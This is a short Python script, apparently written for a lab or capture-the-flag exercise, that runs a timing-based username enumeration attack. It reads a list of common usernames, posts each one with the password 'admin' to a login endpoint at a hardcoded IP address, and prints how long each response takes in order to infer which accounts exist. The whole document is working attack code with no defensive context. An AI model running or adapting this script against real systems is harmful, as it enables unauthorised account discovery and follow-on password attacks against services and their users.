
import requests
import time 

fd = open('top-usernames-shortlist.txt','r')
wordlist = fd.read()
#print(wordlist)
fd.close()


usernames = list(wordlist.split('\n'))

url = "http://139.59.183.98:31177/question3/"


#userid=admin&passwd=admin

for i in usernames:

	data = {
		"userid":i,
		"passwd":"admin"
	}

	t1 = time.perf_counter()
	r = requests.post(url,data=data)
	t2 = time.perf_counter()

	print("User {} took this much time to validate {}".format(i,t2-t1))


